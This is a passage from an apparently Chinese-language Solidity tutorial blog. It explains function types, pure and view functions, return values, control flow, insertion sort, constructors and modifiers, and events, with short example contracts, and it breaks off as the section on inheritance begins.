因为Ethereum会定义所有未使用的空间为0，所以未赋值（<code>Value</code>）的键（<code>Key</code>）初始值都是0。</li></ul><h2 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h2><p>solidity官方文档里把函数归到数值类型。我们先看一下solidity中函数的形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function &lt;function name&gt; (&lt;parameter types&gt;) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types&gt;)]</span><br></pre></td></tr></table></figure><p>从前往后一个一个看（方括号中的是可写可不写的关键字）：</p><ol><li><code>function</code>：声明函数时的固定用法，想写函数，就要以function关键字开头。</li><li><code>&lt;function name&gt;</code>：函数名。</li><li><code>(&lt;parameter types&gt;)</code>：圆括号里写函数的参数，也就是要输入到函数的变量类型和名字。</li><li><code>&#123;internal|external|public|private&#125;</code>：函数可见性说明符，一共4种。没标明函数类型的，默认<code>internal</code>。<ul><li><code>public</code>: 内部外部均可见。(也可用于修饰状态变量，public变量会自动生成 <code>getter</code>函数，用于查询数值).</li><li><code>private</code>: 只能从本合约内部访问，继承的合约也不能用（也可用于修饰状态变量）。</li><li><code>external</code>: 只能从合约外部访问（但是可以用<code>this.f()</code>来调用，<code>f</code>是函数名）</li><li><code>internal</code>: 只能从合约内部访问，继承的合约可以用（也可用于修饰状态变量）。</li></ul></li><li><code>[pure|view|payable]</code>：决定函数权限/功能的关键字。<code>payable</code>（可支付的）很好理解，带着它的函数，运行的时候可以给合约转入<code>ETH</code>。<code>pure</code>和<code>view</code>的介绍需要区分。</li><li><code>[returns ()]</code>：函数返回的变量类型和名称。</li></ol><h3 id="Pure和View"><a href="#Pure和View" class="headerlink" title="Pure和View"></a>Pure和View</h3><p>合约的状态变量存储在链上，gas fee很贵，如果不改变链上状态，就不用付gas。包含pure跟view关键字的函数是不改写链上状态的，因此用户直接调用他们是不需要付gas的（合约中非pure/view函数调用它们则会改写链上状态，需要付gas）。</p><p>在以太坊中，以下语句被视为修改链上状态：</p><ol><li>写入状态变量。</li><li>释放事件。</li><li>创建其他合同。</li><li>使用selfdestruct.</li><li>通过调用发送以太币。</li><li>调用任何未标记<code>view</code>或<code>pure</code>的函数。</li><li>使用低级调用（low-level calls）。</li><li>使用包含某些操作码的内联汇编。</li></ol><p>三种不同的关键字的区别。</p><ul><li><code>pure</code>，中文意思是“纯”，在<code>solidity</code>里理解为“纯纯牛马”。包含<code>pure</code>关键字的函数，不能读取也不能写入存储在链上的状态变量。</li><li><code>view</code>，“看”，在<code>solidity</code>里理解为“看客”。包含<code>view</code>关键字的函数，能读取但也不能写入状态变量。</li><li>不写<code>pure</code>也不写<code>view</code>，函数既可以读取也可以写入状态变量。</li></ul><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><ul><li>智能合约跟大部分语言一样，有局部变量在合约中称为状态变量</li><li>存在返回值并需要指定类型</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line">contract FunctionIntro&#123;</span><br><span class="line">    //状态变量类似局部变量，函数外的那种感觉，函数只处理传来的参数</span><br><span class="line">    //external外部函数，只能在外部读取的函数</span><br><span class="line">    //外部可视：在合约内部的其他函数无法调用该函数，只能够通过外部读取</span><br><span class="line">    //pure纯函数，纯函数表示这个函数既不能读也不能写状态变量，只能够有用局部变量（输入的参数），也就是不做链上的读写操作</span><br><span class="line">    //returns(uint)每个函数需要返回值和类型，这里记得加s</span><br><span class="line">    function add(uint x,uint y) external pure returns(uint)&#123;</span><br><span class="line">        return x + y;//函数内容</span><br><span class="line">    &#125;</span><br><span class="line">    function sub(uint x,uint y) external pure returns(uint)&#123;</span><br><span class="line">        return x - y;//函数内容</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码被部署之后会在部署结果的下方生成两个按钮，点击即可调用传递参数，并且根据函数中的分割符进行参数传递</p><p><img src="/image/media/2022/Solidity/img/3.png"></p><h3 id="view函数"><a href="#view函数" class="headerlink" title="view函数"></a>view函数</h3><p>只要读取了链上的东西就需要用到view</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line">contract FunctionIntro&#123;</span><br><span class="line">    uint public num; </span><br><span class="line">    function viewFunc() external view returns(uint)&#123;</span><br><span class="line">        return num;//函数内容</span><br><span class="line">    &#125;</span><br><span class="line">    function viewaddFunc(uint x) external view returns(uint)&#123;</span><br><span class="line">        return num+x;//函数内容</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="pure函数"><a href="#pure函数" class="headerlink" title="pure函数"></a>pure函数</h3><p>只有局部变量或者什么都没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line">contract FunctionIntro&#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    function pureFunc() external pure returns(uint)&#123;</span><br><span class="line">        return 1;//函数内容</span><br><span class="line">    &#125;</span><br><span class="line">    function add(uint x,uint y) external pure returns(uint)&#123;</span><br><span class="line">        return x + y;//函数内容</span><br><span class="line">    &#125;//因为只处理了参数，并没有读取状态变量</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数输出"><a href="#函数输出" class="headerlink" title="函数输出"></a>函数输出</h2><p>Solidity函数输出，包括：返回多种变量，命名式返回，以及利用解构式赋值读取全部和部分返回值。</p><h3 id="返回值-return和returns"><a href="#返回值-return和returns" class="headerlink" title="返回值 return和returns"></a>返回值 return和returns</h3><p>Solidity有两个关键字与函数输出相关：return和returns，他们的区别在于：</p><ul><li>returns加在函数名后面，用于声明返回的变量类型及变量名；</li><li>return用于函数主体中，返回指定的变量。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 返回多个变量</span><br><span class="line">function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;</span><br><span class="line">return(1, true, [uint256(1),2,5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码中，我们声明了<code>returnMultiple()</code>函数将有多个输出：<code>returns(uint256, bool, uint256[3] memory)</code>，接着我们在函数主体中用<code>return(1, true, [uint256(1),2,5])</code>确定了返回值。</p><h3 id="命名式返回"><a href="#命名式返回" class="headerlink" title="命名式返回"></a>命名式返回</h3><p>可以在returns中标明返回变量的名称，这样solidity会自动给这些变量初始化，并且自动返回这些函数的值，不需要加return。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 命名式返回</span><br><span class="line">function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">_number = 2;</span><br><span class="line">_bool = false; </span><br><span class="line">_array = [uint256(3),2,1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的代码中，我们用<code>returns(uint256 _number, bool _bool, uint256[3] memory _array)</code>声明了返回变量类型以及变量名。这样，我们在主体中只需要给变量<code>_number</code>，<code>_bool</code>和<code>_array</code>赋值就可以自动返回了。</p><p>也可以在命名式返回中用<code>return</code>来返回变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 命名式返回，依然支持return</span><br><span class="line">function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">return(1, true, [uint256(1),2,5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解构式赋值"><a href="#解构式赋值" class="headerlink" title="解构式赋值"></a>解构式赋值</h3><p>solidity使用解构式赋值的规则，支持读取函数的全部或部分返回值。</p><ul><li>读取所有返回值：声明变量，并且将要赋值的变量用<code>,</code>隔开，按顺序排列。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint256 _number;</span><br><span class="line">bool _bool;</span><br><span class="line">uint256[3] memory _array;</span><br><span class="line">(_number, _bool, _array) = returnNamed();</span><br></pre></td></tr></table></figure><ul><li>读取部分返回值：声明要读取的返回值对应的变量，不读取的留空。下面这段代码中，我们只读取<code>_bool</code>，而不读取返回的<code>_number</code>和<code>_array</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(, _bool2, ) = returnNamed();</span><br></pre></td></tr></table></figure><h3 id="本节代码"><a href="#本节代码" class="headerlink" title="本节代码"></a>本节代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line">contract ValueType&#123;</span><br><span class="line">// 返回多个变量</span><br><span class="line">function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;</span><br><span class="line">return(1, true, [uint256(1),2,5]);</span><br><span class="line">&#125;</span><br><span class="line">// 命名式返回</span><br><span class="line">function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">_number = 2;</span><br><span class="line">_bool = false; </span><br><span class="line">_array = [uint256(3),2,1];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> // 命名式返回，依然支持return</span><br><span class="line"> function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line"> return(1, true, [uint256(1),2,5]);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function retrunReturn() public pure&#123;</span><br><span class="line">    uint256 _number;</span><br><span class="line">    bool _bool;</span><br><span class="line">    uint256[3] memory _array;</span><br><span class="line">    (_number, _bool, _array) = returnNamed();</span><br><span class="line">    bool _bool2;</span><br><span class="line">    (, _bool2, ) = returnNamed();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行截图</p><p><img src="/image/media/2022/Solidity/img/8.png"></p><h2 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h2><h4 id="Solidity的控制流"><a href="#Solidity的控制流" class="headerlink" title="Solidity的控制流"></a>Solidity的控制流</h4><p><code>Solidity</code>的控制流与其他语言类似，主要包含以下几种：</p><ul><li><code>if-else</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function ifElseTest(uint256 _number) public pure returns(bool)&#123;</span><br><span class="line">    if(_number == 0)&#123;</span><br><span class="line">    return(true);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    return(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>for循环</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function forLoopTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">    sum += i;</span><br><span class="line">    &#125;</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>while循环</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function whileTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    uint i = 0;</span><br><span class="line">    while(i &lt; 10)&#123;</span><br><span class="line">    sum += i;</span><br><span class="line">    i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>do-while循环</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function doWhileTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    uint i = 0;</span><br><span class="line">    do&#123;</span><br><span class="line">    sum += i;</span><br><span class="line">    i++;</span><br><span class="line">    &#125;while(i &lt; 10);</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>三元运算符</code> 三元运算符是<code>solidity</code>中唯一一个接受三个操作数的运算符，规则<code>条件? 条件为真的表达式:条件为假的表达式</code>。 此运算符经常用作 if 语句的快捷方式。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 三元运算符 ternary/conditional operator</span><br><span class="line">function ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123;</span><br><span class="line">    // return the max of x and y</span><br><span class="line">    return x &gt;= y ? x: y; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还有<code>continue</code>（立即进入下一个循环）和<code>break</code>（跳出当前循环）关键字可以使用。</p><h4 id="实现插入排序"><a href="#实现插入排序" class="headerlink" title="实现插入排序"></a>实现插入排序</h4><p>排序算法解决的问题是将无序的一组数字，例如<code>[2, 5, 3, 1]</code>，从小到大依次排列好。插入排序（<code>InsertionSort</code>）是最简单的一种排序算法，也是很多人学习的第一个算法。它的思路很简答，从前往后，依次将每一个数和排在他前面的数字比大小，如果比前面的数字小，就互换位置。</p><p><img src="/image/media/2022/Solidity/img/ins.gif"></p><h5 id="python实现"><a href="#python实现" class="headerlink" title="python实现"></a>python实现</h5><p>可以先看一下插入排序的python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python program for implementation of Insertion Sort</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insertionSort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(arr)):</span><br><span class="line">        key = arr[i]</span><br><span class="line">        j = i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> j &gt;=<span class="number">0</span> <span class="keyword">and</span> key &lt; arr[j] :</span><br><span class="line">                arr[j+<span class="number">1</span>] = arr[j]</span><br><span class="line">                j -= <span class="number">1</span></span><br><span class="line">        arr[j+<span class="number">1</span>] = key</span><br></pre></td></tr></table></figure><h5 id="solidity-实现"><a href="#solidity-实现" class="headerlink" title="solidity 实现"></a>solidity 实现</h5><p>如果直接修改上面的代码会报错：”solidity insertion sort”，然后发现：<code>solidity</code>中最常用的变量类型是<code>uint</code>，也就是正整数，取到负值的话，会报<code>underflow</code>错误。而在插入算法中，变量<code>j</code>有可能会取到<code>-1</code>，引起报错。</p><p>这里，我们需要把<code>j</code>加1，让它无法取到负值。正确代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 插入排序 正确版</span><br><span class="line">function insertionSort(uint[] memory a) public pure returns(uint[] memory) &#123;</span><br><span class="line">    // note that uint can not take negative value</span><br><span class="line">    for (uint i = 1;i &lt; a.length;i++)&#123;</span><br><span class="line">        uint temp = a[i];</span><br><span class="line">        uint j=i;</span><br><span class="line">        while( (j &gt;= 1) &amp;&amp; (temp &lt; a[j-1]))&#123;</span><br><span class="line">            a[j] = a[j-1];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        a[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    return(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造函数和修饰器"><a href="#构造函数和修饰器" class="headerlink" title="构造函数和修饰器"></a>构造函数和修饰器</h2><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>构造函数（<code>constructor</code>）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的<code>owner</code>地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address owner; // 定义owner变量</span><br><span class="line"></span><br><span class="line">// 构造函数</span><br><span class="line">constructor() &#123;</span><br><span class="line">   owner = msg.sender; // 在部署合约的时候，将owner设置为部署者的地址</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>⚠️：构造函数在不同的solidity版本中的语法并不一致，在Solidity 0.4.22之前，构造函数不使用 <code>constructor</code> 而是使用与合约名同名的函数作为构造函数而使用，由于这种旧写法容易使开发者在书写时发生疏漏（例如合约名叫 <code>Parents</code>，构造函数名写成 <code>parents</code>），使得构造函数变成普通函数，引发漏洞，所以0.4.22版本及之后，采用了全新的 <code>constructor</code> 写法。</p><p>构造函数的旧写法代码示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity =0.4.21;</span><br><span class="line">contract Parents &#123;</span><br><span class="line">    // 与合约名Parents同名的函数就是构造函数</span><br><span class="line">    function Parents () public &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修饰器"><a href="#修饰器" class="headerlink" title="修饰器"></a>修饰器</h3><p>修饰器（<code>modifier</code>）是<code>solidity</code>特有的语法，类似于面向对象编程中的<code>decorator</code>，声明函数拥有的特性，并减少代码冗余。它就像钢铁侠的智能盔甲，穿上它的函数会带有某些特定的行为。<code>modifier</code>的主要使用场景是运行函数前的检查，例如地址，变量，余额等。</p><p>我们来定义一个叫做onlyOwner的modifier：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 定义modifier</span><br><span class="line">modifier onlyOwner &#123;</span><br><span class="line">   require(msg.sender == owner); // 检查调用者是否为owner地址</span><br><span class="line">   _; // 如果是的话，继续运行函数主体；否则报错并revert交易</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代有<code>onlyOwner</code>修饰符的函数只能被<code>owner</code>地址调用，比如下面这个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function changeOwner(address _newOwner) external onlyOwner&#123;</span><br><span class="line">   owner = _newOwner; // 只有owner地址运行这个函数，并改变owner</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们定义了一个<code>changeOwner</code>函数，运行他可以改变合约的<code>owner</code>，但是由于<code>onlyOwner</code>修饰符的存在，只有原先的<code>owner</code>可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。</p><h3 id="OppenZepplin的Ownable标准实现"><a href="#OppenZepplin的Ownable标准实现" class="headerlink" title="OppenZepplin的Ownable标准实现"></a>OppenZepplin的Ownable标准实现</h3><p><code>OppenZepplin</code>是一个维护<code>solidity</code>标准化代码库的组织，他的<code>Ownable</code>标准实现如下： <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol</a></p><h3 id="控制合约权限代码"><a href="#控制合约权限代码" class="headerlink" title="控制合约权限代码"></a>控制合约权限代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line">contract Variables &#123;</span><br><span class="line">    address public owner; // 定义owner变量</span><br><span class="line"></span><br><span class="line">   // 构造函数</span><br><span class="line">   constructor() &#123;</span><br><span class="line">      owner = msg.sender; // 在部署合约的时候，将owner设置为部署者的地址</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">      // 定义modifier</span><br><span class="line">   modifier onlyOwner &#123;</span><br><span class="line">      require(msg.sender == owner); // 检查调用者是否为owner地址</span><br><span class="line">      _; // 如果是的话，继续运行函数主体；否则报错并revert交易</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function changeOwner(address _newOwner) external onlyOwner&#123;</span><br><span class="line">      owner = _newOwner; // 只有owner地址运行这个函数，并改变owner</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击 <code>owner</code> 按钮查看当前 owner 变量。</p><p>以 owner 地址的用户身份，调用 <code>changeOwner</code> 函数，交易成功。</p><p>以非 owner 地址的用户身份，调用 <code>changeOwner</code> 函数，交易失败，因为modifier onlyOwner 的检查语句不满足。</p><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p><code>Solidity</code>中的事件（<code>event</code>）是<code>EVM</code>上日志的抽象，它具有两个特点：</p><ul><li>响应：应用程序（<a href="https://learnblockchain.cn/docs/ethers.js/api-contract.html#id18"><code>ether.js</code></a>）可以通过<code>RPC</code>接口订阅和监听这些事件，并在前端做响应。</li><li>经济：事件是<code>EVM</code>上比较经济的存储数据的方式，每个大概消耗2,000 <code>gas</code>；相比之下，链上存储一个新变量至少需要20,000 <code>gas</code>。</li></ul><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>事件的声明由<code>event</code>关键字开头，然后跟事件名称，括号里面写好事件需要记录的变量类型和变量名。以<code>ERC20</code>代币合约的<code>Transfer</code>事件为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br></pre></td></tr></table></figure><p>我们可以看到，<code>Transfer</code>事件共记录了3个变量<code>from</code>，<code>to</code>和<code>value</code>，分别对应代币的转账地址，接收地址和转账数量。</p><p>同时<code>from</code>和<code>to</code>前面带着<code>indexed</code>关键字，每个<code>indexed</code>标记的变量可以理解为检索事件的索引“键”，在以太坊上单独作为一个<code>topic</code>进行存储和索引，程序可以轻松的筛选出特定转账地址和接收地址的转账事件。每个事件最多有3个带<code>indexed</code>的变量。每个 <code>indexed</code> 变量的大小为固定的256比特。事件的哈希以及这三个带<code>indexed</code>的变量在<code>EVM</code>日志中通常被存储为<code>topic</code>。其中<code>topic[0]</code>是此事件的<code>keccak256</code>哈希，<code>topic[1]</code>到<code>topic[3]</code>存储了带<code>indexed</code>变量的<code>keccak256</code>哈希。 </p><p><code>value</code> 不带 <code>indexed</code> 关键字，会存储在事件的 <code>data</code> 部分中，可以理解为事件的“值”。<code>data</code> 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 <code>data</code> 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 <code>topic</code> 部分中，也是以哈希的方式存储。另外，<code>data</code> 部分的变量在存储上消耗的gas相比于 <code>topic</code> 更少。</p><p>我们可以在函数里释放事件。在下面的例子中，每次用<code>_transfer()</code>函数进行转账操作的时候，都会释放<code>Transfer</code>事件，并记录相应的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 定义_transfer函数，执行转账逻辑</span><br><span class="line">function _transfer(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external &#123;</span><br><span class="line"></span><br><span class="line">    _balances[from] = 10000000; // 给转账地址一些初始代币</span><br><span class="line"></span><br><span class="line">    _balances[from] -=  amount; // from地址减去转账数量</span><br><span class="line">    _balances[to] += amount; // to地址加上转账数量</span><br><span class="line"></span><br><span class="line">    // 释放事件</span><br><span class="line">    emit Transfer(from, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事件的logs可以在下面的地址中查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rinkeby.etherscan.io/tx/0x8cf87215b23055896d93004112bbd8ab754f081b4491cb48c37592ca8f8a36c7</span><br></pre></td></tr></table></figure><p>点击<code>Logs</code>按钮，就能看到事件明细：<code>Topics</code>里面有三个元素，<code>[0]</code>是这个事件的哈希，<code>[1]</code>和<code>[2]</code>是我们定义的两个<code>indexed</code>变量的信息，即转账的转出地址和接收地址。<code>Data</code>里面是剩下的不带<code>indexed</code>的变量，也就是转账数量。</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承是面向对象编程很重要的组成部分，可以显著减少重复代码。如果把合约看作是对象的话，<code>solidity</code>也是面向对象的编程，也支持继承。</p><h3 id="规则-1"><a href="#规则-1" class="headerlink" title="规则"></a>规则</h3><ul><li><code>virtual</code>: 父合约中的函数，如果希望子合约重写，需要加上<code>virtual</code>关键字。</li><li><code>override</code>：子合约重写了父合约中的函数，需要加上<code>override</code>关键字。</li></ul><h3 id="简单继承"><a href="#简单继承" class="headerlink" title="简单继承"></a>简单继承</h3><p>我们先写一个简单的爷爷合约<code>Yeye</code>，里面包含1个<code>Log</code>事件和3个<code>function</code>: <code>hip()</code>, <code>pop()</code>, <code>yeye()</code>，输出都是”Yeye”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 